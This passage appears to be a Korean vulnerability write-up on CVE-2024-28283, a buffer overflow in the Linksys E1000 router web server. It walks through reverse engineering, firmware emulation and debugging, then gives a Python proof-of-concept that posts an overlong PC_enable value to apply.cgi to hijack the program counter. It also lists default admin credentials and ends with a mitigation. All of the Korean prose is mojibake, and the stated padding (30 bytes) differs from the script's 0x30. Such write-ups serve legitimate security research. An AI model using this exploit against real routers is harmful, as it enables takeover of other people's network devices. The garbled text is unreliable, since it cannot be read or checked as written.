![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2013.png){: width="80%" height="80%"}

<br>

ë¬¸ì œì˜ ì¡°ê±´ê³¼ ì™„ì „íˆ ì¼ì¹˜í•˜ëŠ” í•¨ìˆ˜ì„ì„ ì•Œ ìˆ˜ ìˆì—ˆë‹¤.

ì´ìª½ì—ì„œ ë³´ì´ëŠ” ë¬¸ìì—´ë“¤ì€ ë³´í†µ ë¼ìš°í„°ë¥¼ ê´€ë¦¬ ë° ì„¤ì •í•  ë•Œ ë³´ë‚´ëŠ” ì„¤ì •í‚¤ë°¸ë¥˜ì˜ í‚¤ê°’ì¸ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. 

ì™œëƒí•˜ë©´ ë¼ìš°í„° íŒì›¨ì–´ë¼ëŠ” ì ì„ ê³ ë ¤í–ˆì„ ë•Œ WTPëŠ” Wireless Transcation Protocolì˜ ì•½ìì¸ ê²ƒ ê°™ê³ , ë³´í†µ ì´ëŸ° í˜•ì‹ì˜ ë¬¸ìì—´ì´ë©´ ë¼ìš°í„° ê´€ë¦¬ë³€ê²½ ì‹œì— ì‚¬ìš©í•˜ëŠ” í™˜ê²½ë³€ìˆ˜ ê°’ì´ê³ ,

ìœ„ì˜ ìƒê°ì— ê·¼ê±°í•´ linksys pc_enableë¡œ ê²€ìƒ‰í•´ ë³´ë‹ˆ, ì•„ë˜ì™€ ê°™ì´ nvram infoì˜ í‚¤ê°’ ì¤‘ í•˜ë‚˜ì¸ ì ì´ í™•ì¸ë˜ì—ˆê¸° ë•Œë¬¸ì´ë‹¤.(ìŠ¤í¬ë¡¤ì´ ë„ˆë¬´ ê¸¸ì–´ PC_enableì€ ì•ˆ ë³´ì„)

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2014.png){: width="80%" height="80%"}

<br>

ê·¸ëŸ¼ ì´ì œ `pc_change_act` í•¨ìˆ˜ë¥¼ ë“¤ì—¬ë‹¤ ë³´ì. 

ë¬¸ì œì—ì„œëŠ” íŒíŠ¸ë¡œ `get_cgi`ë¥¼ ì–¸ê¸‰í–ˆëŠ”ë°, `get_cgi`ì˜ xrefë¥¼ ë³´ë©´ ë§¤ìš° ë§ì€ ì ì„ ì•Œ ìˆ˜ ìˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2015.png){: width="80%" height="80%"}

<br>

ì´ëŸ° ìƒí™©ì—ì„œ `get_cgi`ë¥¼ ë£¨íŠ¸ì»¤ì¦ˆë¡œ íŒë‹¨í•˜ëŠ” ê²ƒì€ ë…¼ë¦¬ì ìœ¼ë¡œ í‹€ë¦° ì¶”ì¸¡ì´ ëœë‹¤.

ê·¸ë³´ë‹¤ëŠ” `get_cgi`ì˜ ê°’ì„ ë‚´ë¶€ì ìœ¼ë¡œ ì²˜ë¦¬í•˜ëŠ” ê³¼ì •ì—ì„œ ë¬¸ì œê°€ ìƒê²¼ë‹¤ê³  ë³´ëŠ” ê²ƒì´ ë§ê³ , ë”°ë¼ì„œ `pc_change_act` í•¨ìˆ˜ì— ë£¨íŠ¸ì»¤ì¦ˆê°€ ìˆë‹¤ê³  íŒë‹¨í•˜ëŠ” ê²ƒì´ ë§ë‹¤ê³  ìƒê°í•œë‹¤.

ì´ì œ ìƒì„¸í•˜ê²Œ ë‚´ë¶€ ë°ì´í„° ì²˜ë¦¬ ë£¨í‹´ì„ íŒŒì•…í•´ ë³´ì.

ë¨¼ì € í•´ë‹¹ í•¨ìˆ˜ì˜ ë‚´ë¶€ì—ì„œëŠ” `sscanf`, `sprintf`ë¥¼ ì‚¬ìš©í•˜ê³  ìˆëŠ” ê²ƒì´ ë³´ì¸ë‹¤.

ê·¸ëŸ¬ë‚˜ `sscanf`ë¥¼ ë³´ë©´ íŒì›¨ì–´ê°€ ì‘ë™ ì¤‘ì¸ ì •ë³´ì‹œìŠ¤í…œ ì™¸ë¶€ì˜ ê°’ì´ í™œìš©ë  ì—¬ì§€ê°€ ë‚®ì•„ ë³´ì¸ë‹¤. `nvram_get` í•¨ìˆ˜ëŠ” â€œTMSSS_enableâ€ nvram ì—”íŠ¸ë¦¬ì—ì„œ valueë¥¼ ê°€ì ¸ì˜¤ëŠ”ë°, ë¹„ë¡ ì´ê²Œ user controlled dataì´ì§€ë§Œ `sscanf`ì—ì„œ %dë¡œ í•¸ë“¤ë§í•˜ê¸° ë•Œë¬¸ì— RCEë¡œ ì´ì–´ì§ˆ ê°€ëŠ¥ì„±ì´ ë‚®ê¸° ë•Œë¬¸ì´ë‹¤.

ë”°ë¼ì„œ `sprintf`ì— ì§‘ì¤‘í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png){: width="80%" height="80%"}

<br>

v5ëŠ” 24byte í¬ê¸° ë°°ì—´ì¸ë°, ì„¤ì • íŒŒë¼ë¯¸í„° í‚¤ê°’ì„ ë°ì´í„° ì²˜ë¦¬ íŒŒë¼ë¯¸í„°ë¡œ ì¼ê¸° ë•Œë¬¸ì— user controlled dataì¸ `PC_enable`ì˜ valueë¥¼ ë¦¬í„´í•  ê°€ëŠ¥ì„±ì´ ë†’ì€ `get_cgi(â€PC_enableâ€)`ì˜ ê°’ì„ ê·¸ëŒ€ë¡œ ë³µì‚¬í•´ ë°›ëŠ”ë‹¤.

BOFê°€ ì˜ì‹¬ë˜ëŠ” ì •í™©ì´ë‹¤. 

ë”°ë¼ì„œ í•¨ìˆ˜ë¥¼ íƒ€ê³  ë“¤ì–´ê°€ë©° ì¶”ì¸¡ì´ ë§ëŠ”ì§€ ë” ì •í™•íˆ ì•Œì•„ë³´ì•˜ë‹¤.

<br>

**get_cgi**

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2017.png){: width="80%" height="80%"}

<br>

`get_cgi` ë‚´ë¶€ì—ì„œ 0ì´ ì•„ë‹Œ ë‹¤ë¥¸ ê°’ì„ ë¦¬í„´í•˜ë ¤ë©´ `get_xss`ê°€ ì½œë˜ì–´ì•¼ í•œë‹¤.

ëˆˆì¹˜ìƒ `hsearch_r`ì—ì„œ v3ê³¼ a1ì„ ê·¼ê±°ë¡œ ê²€ìƒ‰ì„ ìˆ˜í–‰í•´ì„œ, ë³„ ë¬¸ì œ ì—†ìœ¼ë©´ v4ê°€ a1(â€œPC_enableâ€ì˜ ì‹œì‘ì£¼ì†Œ)ë¥¼ ê°€ë¦¬í‚¬ ê²ƒ ê°™ë‹¤.

<br>

**get_xss**

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2018.png){: width="80%" height="80%"}

<br>

ë³´ì•ˆ ì¡°ì¹˜ì¸ ê²ƒ ê°™ë‹¤. XSS ìœ ë°œí•˜ëŠ” code signatureê°€ ìˆëŠ”ì§€ íŒë‹¨í•˜ëŠ” ê²ƒìœ¼ë¡œ ë³´ì´ëŠ”ë°,

ë¦¬í„´ê°’ì´ ìœ ì˜ë¯¸í•œ ê°’ì´ ë˜ê¸° ìœ„í•´ì„œëŠ” if ë¬¸ì´ falseê°€ ë˜ê³  v2ê°€ ë¦¬í„´ë˜ëŠ” í”Œë¡œìš°ê°€ ì§„í–‰ë˜ì–´ì•¼ í•œë‹¤. ì¦‰, XSS ë¬¸ì œê°€ ì—†ëŠ” ì…ë ¥ê°’ì´ì–´ì•¼ í•œë‹¤.

ê·¸ë ‡ë‹¤ë©´ ë­ê°€ v2ì— ê°’ì„ í• ë‹¹í•˜ëŠ”ê°€? if ë¬¸ì˜ ê°€ì¥ ë§ˆì§€ë§‰ ì¡°ê±´ì´ë‹¤.

<br>

```c
|| (v4 = strchr(a1, 62), v2 = a1, v4) 
&& (v5 = strstr(a1, "<&nbsp;>"), v2 = a1, !v5)
```

<br>

ìœ„ ì¡°ê±´ì— ëŒ€í•œ ê²€ì‚¬ë¥¼ ê±°ì¹˜ê³  ë‚˜ë©´ v2ì—ëŠ” a1ì´ ì €ì¥ëœë‹¤. 

ì¦‰, `get_cgi`ì— ì¸ìˆ˜ë¡œ ì¤€ `PC_enable`ì˜ ì‹œì‘ì£¼ì†Œê°€ ê·¸ëŒ€ë¡œ `pc_change_act`ì˜ ë³€ìˆ˜ cgiì— ë“¤ì–´ê°„ë‹¤.

í•´ë‹¹ ë°”ì´ë„ˆë¦¬(httpd)ëŠ” gcc-compiled c/c++ ë°”ì´ë„ˆë¦¬ë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2019.png){: width="40%" height="40%"} ![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2020.png){: width="40%" height="40%"}

<br>


![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2021.png){: width="40%" height="400%"}![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2022.png){: width="40%" height="40%"}

<br>

ìœ„ì™€ ê°™ì´ IDAì—ì„œ í™•ì¸ëœ ì •ë³´ì™€ ì»´íŒŒì¼ëŸ¬ì˜ convention ë“±ì„ ê³ ë ¤í–ˆì„ ë•Œ,

`30byte+RET addr+shellcode` ë¡œ ì£¼ë©´ ìµìŠ¤í”Œë¡œì‡ì´ ë  ê²ƒì²˜ëŸ¼ ë³´ì¸ë‹¤. ë¬¼ë¡  RCEë¥¼ í•˜ê³  ì‹¶ìœ¼ë©´ NX-bit ë“±ì´ ê±¸ë ¤ìˆëŠ”ì§€ í™•ì¸í•´ì•¼ í•˜ì§€ë§Œ

PoCëŠ” `30byte+RET addr taint(4byte)`ê¹Œì§€ë§Œ í•˜ë©´ ë  ê²ƒ ê°™ë‹¤.

<br>

ë¬¼ë¡  ì •ì ìœ¼ë¡œ ì•Œì•„ë‚¼ ìˆ˜ ìˆëŠ” ë°ì—ëŠ” í•œê³„ê°€ ìˆë‹¤. ë”°ë¼ì„œ ìœ„ ì„¹ì…˜ì—ì„œ ì„œìˆ í–ˆë˜ ì¶”ì¸¡ì„ í™•ì‹¤í•˜ê²Œ í•˜ë ¤ë©´, ë™ì ìœ¼ë¡œ ë¶„ì„í•´ì•¼ í•œë‹¤.

ë³„ë‹¤ë¥¸ dynamic analysis preventionì´ ì•ˆ ê±¸ë ¤ ìˆëŠ” ê²ƒìœ¼ë¡œ ë³´ì´ê¸° ë•Œë¬¸ì—, ì € ìœ„ì¹˜ì— bpë¥¼ ê±¸ê³  ì‹¤í–‰í•œ ë‹¤ìŒ ë°ì´í„°ê°€ ì˜¤ê°€ëŠ” ë¶€ë¶„ì„ ë³¸ë‹¤.

<br>

---

ì‚¬ì¡±ì´ì§€ë§Œ, nvram_get í•¨ìˆ˜ ìì²´ì—ì„œ ì·¨ì•½ì ì´ ë°œìƒí•  ì—¬ì§€ê°€ ë†’ì•„ ë³´ì—¬ ê°œì¸ì ìœ¼ë¡œ ê²€ìƒ‰í•´ ë´¤ëŠ”ë°, ë°œìƒí•œ ì´ë ¥ì´ ìˆì—ˆë‹¤. ì¶”ê°€ë¡œ, `apply.cgi` url ë˜í•œ ì•„ë˜ ì·¨ì•½ì ì—ì„œë„ ì·¨ì•½í–ˆë˜ urlì´ì—ˆë‹¤.

> CVE-2018-3953
> 
> 
> Devices in the Linksys ESeries line of routers (Linksys E1200 Firmware Version 2.0.09 and Linksys E2500 Firmware Version 3.0.04) are susceptible to OS command injection vulnerabilities due to improper filtering of data passed to and retrieved from NVRAM. Data entered into the 'Router Name' input field through the web portal is submitted to apply.cgi as the value to the 'machine_name' POST parameter. When the 'preinit' binary receives the SIGHUP signal, it enters a code path that continues until it reaches offset 0x0042B5C4 in the 'start_lltd' function. **Within the 'start_lltd' function, a 'nvram_get' call is used to obtain the value of the user-controlled 'machine_name' NVRAM entry. This value is then entered directly into a command intended to write the host name to a file and subsequently executed.**
> 

KARONTEë¥¼ ëŒë ¤ë„ httpdëŠ” border binary ë¡œ ì¹˜ì§€ ì•Šì•„ ë¶„ì„ ëŒ€ìƒìœ¼ë¡œ ë³´ì§€ ì•Šì•˜ë‹¤. ì¦‰, KARONTEë¡œëŠ” ë¬¸ì œ ì·¨ì•½ì ì„ ì°¾ì•„ë‚¼ ìˆ˜ ì—†ì—ˆë‹¤. 

ë”°ë¼ì„œ ë¬¸ì œ ì·¨ì•½ì ì´ ì–´ë–¤ ê²½ë¡œë¡œ ë°œê²¬ëëŠ”ì§€ ê³ ë¯¼í•˜ê³  ìˆì—ˆëŠ”ë°, Linksys ë¼ìš°í„° E ì‹œë¦¬ì¦ˆì—ì„œ ë°œìƒí–ˆë˜ ì·¨ì•½ì  ì´ë ¥ì„ ëª¨ë‘ ëª¨ì€ ë‹¤ìŒ í•´ë³¼ ë§Œí•œ ê³³ì„ ê³µëµí•˜ëŠ” ì •ì„ì ì¸ ë°©ì‹ì„ ì“´ ê²ƒ ê°™ì•˜ë‹¤.

---

<br>

## 1.2. ìµìŠ¤í”Œë¡œì‡ í™˜ê²½ ì…‹ì—…

[https://github.com/pr0v3rbs/FirmAE](https://github.com/pr0v3rbs/FirmAE) ì—ì„œ Firmware Emulatorë¥¼ ë‹¤ìš´ë°›ì•„ ì§ì ‘ íŒì›¨ì–´ë¥¼ êµ¬ë™í•˜ê³ , pc_change_act ë¥¼ ì°¸ì¡°í•˜ëŠ” ê¸°ëŠ¥ì— ì§ì ‘ í˜ì´ë¡œë“œë¥¼ ë³´ë‚´ ë³´ëŠ” ê²ƒì„ ëª©ì ìœ¼ë¡œ í•œë‹¤.

ì—ë®¬ë ˆì´í„° ë‹¤ìš´ë¡œë“œ í›„ ë ˆí¬ì— ë‚˜ì˜¨ ëŒ€ë¡œ ì„¤ì •ì„ ëë‚´ê³ , ì•„ë˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í–ˆë‹¤.

`$ sudo ./run.sh -c linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin`

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2023.png){: width="80%" height="80%"}

<br>

ê·¸ ê²°ê³¼, 192.168.1.1ì— íŒì›¨ì–´ìƒì˜ ì›¹ì„œë²„ê°€ êµ¬ë™ëœ ê²ƒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.

ì´ì œ ë””ë²„ê¹…ì„ ìœ„í•´ ì•„ë˜ ëª…ë ¹ì–´ë¥¼ ì‹¤í–‰í–ˆë‹¤.

`$ sudo ./run.sh -d linksys ./firmwares/FW_E1000_2.1.03.005_US_20140321.bin`

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2024.png){: width="80%" height="80%"}

<br>

ì •ìƒ êµ¬ë™ë˜ì—ˆìŒì„ í™•ì¸í•  ìˆ˜ ìˆì—ˆë‹¤.

ì´ì œ run gdbserver ì˜µì…˜ì„ ì„ íƒí•´ target pidì— httpdì˜ pidë¥¼ ì…ë ¥í–ˆë‹¤. 

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2025.png){: width="80%" height="80%"}

<br>

gdb-multiarchë¥¼ ì„¤ì¹˜í•´ ìœ„ ì‚¬ì§„ì— ë‚˜ì˜¨ ëŒ€ë¡œì˜ instructionì„ ë”°ëë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2026.png){: width="80%" height="80%"}

<br>

pc_change_actì— ì ‘ê·¼í•˜ëŠ” ìš”ì²­ì„ ì°¾ê³  ì‹¶ì–´ì„œ, gdbì—ì„œ ë‹¤ìŒê³¼ ê°™ì´ ì¤‘ë‹¨ì ì„ ì„¤ì •í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2027.png){: width="80%" height="80%"}

<br>

ì´ì œ cë¡œ ì‹¤í–‰ë˜ë„ë¡ í•´ ë‘ê³ , ì›¹ì„œë²„ì— ì ‘ê·¼í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2028.png){: width="80%" height="80%"}

<br>

id, pwëŠ” cisco ì´ˆê¸° id:pwê°’ì¸ admin:admin í˜¹ì€ cisco:ciscoë¥¼ ë„£ì–´ë³´ë©´ ë¡œê·¸ì¸ë  ê²ƒì´ë‹¤.

admin:adminì´ì—ˆë‹¤.

ìµìŠ¤í”Œë¡œì‡ íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ë‹¤ì‹œ ë³´ì. 

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2016.png){: width="80%" height="80%"}

<br>

ì¦‰, í•´ë‹¹ í•¨ìˆ˜ì— ë‚ ì•„ê°€ëŠ” ìš”ì²­ì€ ë¬´ì¡°ê±´ ìœ„ì˜ strings ì¤‘ í•˜ë‚˜ë¥¼ í¬í•¨í•  ìˆ˜ë°–ì— ì—†ë‹¤.

ë”°ë¼ì„œ, ì›¹ì„œë²„ë¥¼ êµ¬ì„±í•˜ëŠ” íŒŒì¼ë“¤ì— ëŒ€í•´ `PC_enable` stringì´ ì¡´ì¬í•˜ëŠ”ì§€ ì „ìˆ˜ì¡°ì‚¬ë¥¼ ì§„í–‰í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2029.png){: width="80%" height="80%"}

<br>

ê·¸ ê²°ê³¼,  `GuestNetworkSetting.asp`ì— í•´ë‹¹ ë¬¸ìì—´ì´ ì¡´ì¬í•¨ì„ í™•ì¸í–ˆë‹¤.

ë”°ë¼ì„œ `192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55` ì— ì ‘ê·¼í•´ì„œ, ì•„ë¬´ ë‚´ìš©ì´ë‚˜ ë°”ê¾¼ ë‹¤ìŒ â€˜Save Settingsâ€™ë¥¼ í´ë¦­í•´ ë³´ì•˜ë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2030.png){: width="80%" height="80%"}

<br>

ìœ„ì™€ ê°™ì´ ê¸°ì¡´ì— ì„¤ì •í•´ ë‘ì—ˆë˜ bpì— ê±¸ë¦¼ì„ í™•ì¸í–ˆë‹¤. ì¦‰, íƒ€ê²Ÿ í•¨ìˆ˜ë¥¼ ì •ìƒì ìœ¼ë¡œ ì°¸ì¡°í•¨ì„ í™•ì¸í–ˆë‹¤.

<br>

## 1.3. ìµìŠ¤í”Œë¡œì‡ ì„¤ê³„

ì´ì œ ê³µê²© ì§€ì ì„ ì•Œì•˜ìœ¼ë‹ˆ ìµìŠ¤í”Œë¡œì‡ì„ ì„¤ê³„í•  ì°¨ë¡€ë‹¤. 

ìµìŠ¤ íŒ¨í‚·ì„ ì„¤ê³„í•˜ê¸° ìœ„í•´ ì •ìƒ ìš”ì²­ì˜ í¬ë§·ì„ í™•ì¸í–ˆë‹¤.

í•´ë‹¹ ìš”ì²­ì´ ì–´ë–¤ í¬ë§·ìœ¼ë¡œ ë‚ ì•„ê°€ëŠ”ì§€ ì•Œê¸° ìœ„í•´ tcpdumpë¥¼ ì‚¬ìš©í–ˆë‹¤. 

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2031.png){: width="80%" height="80%"}

<br>

ê·¸ ê²°ê³¼ ì•„ë˜ì™€ ê°™ì€ íŒ¨í‚· ë‚´ìš©ì„ ì–»ì„ ìˆ˜ ìˆì—ˆë‹¤.(ê°œë°œì ë„êµ¬ë¡œë„ í™•ì¸ ê°€ëŠ¥í•˜ë‚˜, ê°œë°œì ë„êµ¬ë¡œëŠ” íŒ¨í‚· ë‚´ìš©ì„ ì˜ˆì˜ê²Œ ì–»ê¸° ì–´ë ¤ì›Œ rawdataë¥¼ ì§ì ‘ ì–»ì—ˆë‹¤)

```
POST /apply.cgi;session_id=a5603bc78a2241abfe43afefbb587c55 HTTP/1.1
Host: 192.168.1.1
Connection: keep-alive
Content-Length: 140
Cache-Control: max-age=0
Origin: http://192.168.1.1
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9

submit_button=GuestNetworkSetting&change_action=&gui_action=Apply&wait_time=19&submit_type=&del_mac=&gn_lan_ipaddr=4&gn_enable=0&PC_enable=1
```

<br>

## 1.4. ìµìŠ¤í”Œë¡œì‡

> ìœ„ì™€ ê°™ì´ IDAì—ì„œ í™•ì¸ëœ ì •ë³´ë¥¼ ê³ ë ¤í–ˆì„ ë•Œ,
> 
> 
> PoCëŠ” `30byte+RET addr taint(4byte)`ê¹Œì§€ë§Œ í•˜ë©´ ë  ê²ƒ ê°™ë‹¤.
> 

ì•ì„œ ì´ë ‡ê²Œ ë¶„ì„í•œ ë°”ê°€ ìˆê³ , ìœ„ì™€ ê°™ì´ ì •ìƒ íŒ¨í‚·ì˜ í˜•íƒœë„ ì•Œê³  ìˆìœ¼ë‹ˆ ì´ì œ ìµìŠ¤í”Œë¡œì‡ì„ ë§Œë“¤ì–´ ë³´ì. ì‹œê°„ì´ ë¶€ì¡±í•´ ê¸°ì¡´ì— ì¡´ì¬í•˜ëŠ” ìµìŠ¤í”Œë¡œì‡ì„ í™œìš©í–ˆë‹¤.

<br>

```python
# ex.py

import requests

target=input("Enter target IP: ")
session_id=input("Enter session_id: ")

url="http://"+target+"/apply.cgi;session_id="+session_id
headers={}
headers["User-Agent"]="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/112.0"
headers["Accept"]="text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
headers["Accept-Language"]= "en-US,en;q=0.5"
headers["Accept-Encoding"]= "gzip, deflate"
headers["Content-Type"] = "application/x-www-form-urlencoded"
headers["Origin"]="http://"+target
headers["Connection"]="close"
headers["Referer"]="http://"+target+"/apply.cgi;session_id="+session_id
headers["Upgrade-Insecure_Requests"]="1"

data={}
data["submit_button"]="GuestNetworkSetting"
data["gui_action"]="Apply"

pay=b"A"*0x30	#dummy
pay+=b"B"*4		#return address
data["PC_enable"]=pay

r=requests.post(url,headers=headers,data=data)

```

<br>

ìœ„ ìŠ¤í¬ë¦½íŠ¸ë¥¼ ì•„ë˜ì™€ ê°™ì´ ì‹¤í–‰í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2032.png){: width="80%" height="80%"}

<br>

ê·¸ ê²°ê³¼, gdbì—ì„œ ì •ìƒì ìœ¼ë¡œ í¬ë˜ì‹œê°€ ë°œìƒí•œ ì ì„ í™•ì¸í–ˆë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2033.png){: width="80%" height="80%"}

<br>

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2034.png){: width="80%" height="80%"}

<br>

PCë ˆì§€ìŠ¤í„°(next instructionì„ ê°€ë¦¬í‚¤ëŠ” program counter ë ˆì§€ìŠ¤í„°)ì— `0x42424242`, ì¦‰ taintê°€ ì˜ ë“¤ì–´ê°”ë‹¤.

<br>

# 2. ìµìŠ¤í”Œë¡œì‡ì„ í†µí•´ ê°€ëŠ¥í•œ ì¹¨í•´ ì‹œë‚˜ë¦¬ì˜¤

í•´ë‹¹ íŒì›¨ì–´ì˜ ìŠ¤íƒê³¼ í™ì€ ì–´ë–¤ ê¶Œí•œìœ¼ë¡œ ëŒì•„ê°€ëŠ” ì¤‘ì¸ì§€ í™•ì¸í•´ ë³´ì•˜ë‹¤.

![/assets/img/posts/2025-01-27-CVE-2024-28283/image.png](/assets/img/posts/2025-01-27-CVE-2024-28283/image%2035.png){: width="80%" height="80%"}

<br>

ì „ë¶€ ì‹¤í–‰ ê¶Œí•œì„ ê°€ì§„ ì±„ë¡œ ëŒì•„ê°„ë‹¤â€¦.

- ì„ë² ë””ë“œ ë””ë°”ì´ìŠ¤ ì¹©ì…‹ì˜ ì»´í“¨íŒ… ëŠ¥ë ¥ì„ ê³ ë ¤í–ˆï¿½ï¿½ï¿½ ë•Œ, íŒì›¨ì–´ëŠ” ë†’ì€ í™•ë¥ ë¡œ ASLRì´ ê±¸ë¦¬ì§€ ì•Šì€ í™˜ê²½ì—ì„œ ëŒì•„ê°ˆ ê²ƒì´ë‹¤.
    - ì¦‰ ê¸°ì´ˆì ì¸ ì‹œìŠ¤í…œ í•´í‚¹ ëŠ¥ë ¥ì´ ìˆë‹¤ë©´ ëˆ„êµ¬ë‚˜  RCEê°€ ê°€ëŠ¥í•˜ë‹¤.
- ë˜í•œ, í•´ë‹¹ ë¼ìš°í„°ëŠ” ì ‘ê·¼ ê¶Œí•œì„ ì„¸ì…˜ IDë¡œ êµ¬ë¶„í•˜ê³  ìˆìœ¼ë‚˜ ì„¸ì…˜ IDê°€ ì•„ë˜ì™€ ê°™ì´ GETì˜ íŒŒë¼ë¯¸í„°ë¡œ ë“¤ì–´ì˜¤ê³  ìˆì—ˆìœ¼ë©°, http í†µì‹ ì„ ì‚¬ìš©í•˜ì—¬ ì•”í˜¸í™”ë˜ì§€ ì•Šì€ íŠ¸ë˜í”½ì„ ë§¤ê°œí•˜ê³  ìˆì—ˆë‹¤.
    - `192.168.1.1/GuestNetworkSetting.asp;session_id=a5603bc78a2241abfe43afefbb587c55`
    - ë”°ë¼ì„œ ì¶©ë¶„íˆ MITM ê³µê²©ì„ í†µí•œ ê´€ë¦¬ì ì„¸ì…˜ íƒˆì·¨ê°€ ê°€ëŠ¥í•˜ë©°, í•´ë‹¹ ë¼ìš°í„°ì—ì„œëŠ” L7ê¹Œì§€ì˜ ê¸°ëŠ¥ì„ ì œê³µí•˜ëŠ” ê´€ê³„ë¡œ Application ë ˆë²¨ì—ì„œ ê°€ëŠ¥í•œ ê³µê²©(ì›¹ ìµìŠ¤í”Œë¡œì‡)ì„ ìˆ˜í–‰í•  ìˆ˜ ìˆë‹¤.
- í˜¹ì€ ì•…ì„± íŒŒì¼ ìœ í¬ì§€ë¡œë„ ì‚¬ìš©í•  ìˆ˜ ìˆì„ ê²ƒì´ë‹¤.

ë¬¼ë¡  ì´ì™€ ê°™ì€ ì„¤ì •ì„ ê°€ì§„ ë¼ìš°í„°ëŠ” ì‚¬ë‚´ì˜ ë‚´ë¶€ë§ ì •ë„ì—ì„œë§Œ ì‚¬ìš©í•  í™•ë¥ ì´ ë†’ìœ¼ë‚˜, ë§ë¶„ë¦¬ í™˜ê²½ì—ì„œë„ ì¹¨í•´ì‚¬ê³ ëŠ” ë°œìƒí•˜ê¸° ë•Œë¬¸ì— ì¹¨í•´ì‚¬ê³  ë°œìƒì‹œì˜ ìœ„í—˜ë„ë¥¼ í¬ê²Œ ë†’ì´ëŠ” ì·¨ì•½ì ìœ¼ë¡œ íŒë‹¨ëœë‹¤.

<br>

# 3. Mitigation ì œì‹œ

ì¼ì°¨ì ìœ¼ë¡œëŠ” íŒ¨í‚¹ì„ í•´ì•¼ í•˜ê¸´ í•˜ì§€ë§Œ, ì„ë² ë””ë“œ ë””ë°”ì´ìŠ¤ì˜ íŠ¹ì„±ìƒ ì»´í“¨íŒ… ë¦¬ì†ŒìŠ¤ì˜ í•œê³„ë¡œ ì¸í•´ ì‹¬ë³¼ì„ ë‚ ë¦¬ëŠ” ê²ƒ ì´ìƒì˜ íŒ¨í‚¹ì€ ì–´ë ¤ìš¸ ê²ƒìœ¼ë¡œ ë³´ì¸ë‹¤. 

ì¦‰ `sprintf`ë¥¼ `snprintf`ë¡œ ë³€ê²½í•´ì„œ ì˜¬ë°”ë¥¸ ë°ì´í„° í¬ê¸° ê´€ë¦¬ë¥¼ í•˜ëŠ” ê²ƒì´ í˜„ì¬ë¡œì„œëŠ” ê°€ì¥ ê·¼ë³¸ì ì¸ í•´ê²°ì±…ì´ë‹¤.